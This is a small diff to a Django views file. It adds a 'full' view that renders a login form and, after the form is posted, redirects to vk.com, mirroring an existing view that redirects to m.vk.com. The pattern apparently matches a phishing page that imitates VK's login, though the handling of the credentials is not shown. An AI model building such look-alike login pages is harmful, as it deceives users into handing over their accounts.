@@ -24,3 +24,10 @@ def index(request):
         return HttpResponsePermanentRedirect("https://m.vk.com")
     form = login()
     return render(request, "app_serverr/index.html", {"form": form})
+
+
+def full(request):
+    if request.method == "POST":
+        return HttpResponsePermanentRedirect("https://vk.com")
+    form = login()
+    return render(request, "app_serverr/full.html", {"form": form})
